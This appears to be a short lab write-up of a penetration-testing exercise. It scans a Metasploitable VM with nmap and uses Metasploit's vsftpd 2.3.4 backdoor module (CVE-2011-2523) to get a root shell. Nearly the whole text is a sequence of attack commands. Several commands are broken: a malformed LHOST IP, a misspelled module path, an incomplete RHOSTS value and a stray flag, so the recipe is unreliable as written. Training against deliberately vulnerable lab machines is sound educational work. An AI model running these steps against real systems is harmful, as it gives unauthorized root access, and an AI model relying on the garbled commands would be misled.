# Attack Steps

1. Ran an nmap scan on Metasploitable using:
```Zsh
nmap -sV -p- 192.168.209.11
```
```Zsh
-sV-
```
- Detects service versions

```Zsh
-p-
```
- Scans all 65535 ports, not just the common ones, since Metasploitable deliberately has alot open

2. Port 21 - vsfto2 2.3.4
- Famous vulnerability in security training, known backdoor (CVE-2011-2523), extremely well-documented and easy to demonstrate

3. Opening Metasploit on Kali
```Zsh
msfconsole
```
```Zsh
ifconfig
```
- Finds Kali's IP (192.168.209.6)

```Zsh
set LHOST 1192.168.209.6
```
- Set Kali's LHOST IP

```Zsh
search vsftpd
```
- Search for and select exploit
- Which successfully shows "exploit/unix/ftp/vsftpd_234_backdoor"
```Zsh
use exploit/unit/ftp/vsftp_234_backdoor
```
- Use the exploit

```Zsh
set RHOSTS 192.168.209
```
- Set target

```Zsh
run
```
- Runs the command

4. Success
```Zsh
shell
```
- Confirms root access, proof of compromise

```Zsh
whoami
```
- returns root proving full admin access

```Zsh
id
uname -a
```
- Shows user's identity and checks version of Linux